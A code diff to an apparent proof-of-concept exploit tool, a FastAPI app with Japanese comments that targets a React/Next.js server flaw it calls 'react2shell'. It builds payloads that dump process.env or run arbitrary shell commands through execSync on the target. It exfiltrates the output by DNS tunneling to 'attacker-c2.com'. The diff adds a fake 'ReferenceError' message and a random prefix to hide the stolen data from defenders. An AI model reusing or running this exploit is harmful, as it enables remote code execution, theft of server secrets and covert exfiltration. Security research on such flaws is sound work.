@@ -13,6 +13,7 @@ app = FastAPI(
 
 app_base_path = "/poc"
 
+
 def get_session_id():
     """
     ランダムなセッションIDを生成します。
@@ -31,22 +32,22 @@ def dns_tunneling(original_bytes: bytes, c2_domain: str):
     """
     # 1. 盗んだデータを16進数（hex）に変換
     if isinstance(original_bytes, str):
-        original_bytes = original_bytes.encode('utf-8')
-    
+        original_bytes = original_bytes.encode("utf-8")
+
     data_hex = original_bytes.hex()
 
     # 解決先（resolver）のカスタム設定
     resolver = dns.resolver.Resolver(configure=False)
     # dig @127.0.0.1 と同じことをするためにネームサーバーを指定
-    resolver.nameservers = ['127.0.0.1']
-    resolver.port = 1053 # 検証用DNSサーバーの動作しているポート
-    
+    resolver.nameservers = ["127.0.0.1"]
+    resolver.port = 1053  # 検証用DNSサーバーの動作しているポート
+
     # 2. 30文字ずつに分割してループ
     chunk_size = 30
     session_id = get_session_id()
     for i in range(0, len(data_hex), chunk_size):
         chunk = data_hex[i : i + chunk_size]
-        sequence_number = i // chunk_size # 切り捨てて除算
+        sequence_number = i // chunk_size  # 切り捨てて除算
 
         # 3. 連結して完全な形のドメインを作成
         # 例: 0.61646d...attacker-c2.com
@@ -69,7 +70,14 @@ def dns_tunneling(original_bytes: bytes, c2_domain: str):
     try:
         resolver.resolve(eof_fqdn, "A", lifetime=1)
     except:
-        pass    
+        pass
+
+
+def get_dummy_error_message() -> tuple[str, str]:
+    error_msg = "Uncaught ReferenceError: _is_loading is not defined"
+    fake_prefix_js = "'ERR_NODE_' + Math.random().toString(16).slice(2, 8) + ':'"
+
+    return (error_msg, fake_prefix_js)
 
 
 @app.post(f"{app_base_path}/react2shell/command/", tags=["poc"], response_model=dict)
@@ -100,10 +108,20 @@ async def execute_command(body: dict):
     padding_size = 65 * 1024  # 65KB
     padding_data = "A" * padding_size
 
+    error_msg, fake_prefix_js = get_dummy_error_message()
+
     if getenv:
-        payload = "var env_data = JSON.stringify(process.env); throw Object.assign(new Error('NEXT_REDIRECT'), {digest: env_data});"
+        payload = f"""
+        var data = JSON.stringify(process.env);
+        var masked = {fake_prefix_js} + data;
+        throw Object.assign(new Error('{error_msg}'), {{digest: masked}});
+        """
     else:
-        payload = f"var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
+        payload = f"""
+        var res = process.mainModule.require('child_process').execSync('{executable_command}',{{'timeout':5000}}).toString().trim();
+        var masked = {fake_prefix_js} + res;
+        throw Object.assign(new Error('{error_msg}'), {{digest: masked}});
+        """
 
     # ----------------------------------------------------
     # チャンク 0: 悪意のあるフェイクチャンクの定義 (RCEペイロード)
@@ -152,9 +170,9 @@ async def execute_command(body: dict):
     print(res.status_code)
 
     # content（生のバイト列）を明示的に UTF-8 でデコードする
-    # errors='replace' を入れることで、万が一壊れたバイナリがあってもエラーで止まらない    
-    decoded_result = res.content.decode('utf-8', errors='replace')
-    print(decoded_result) # res.textでは文字化けしてしまう。
+    # errors='replace' を入れることで、万が一壊れたバイナリがあってもエラーで止まらない
+    decoded_result = res.content.decode("utf-8", errors="replace")
+    print(decoded_result)  # res.textでは文字化けしてしまう。
 
     # C2サーバーに文字化けさせず転送するためにcontent（バイト列）を利用する。
     dns_tunneling(res.content, "attacker-c2.com")
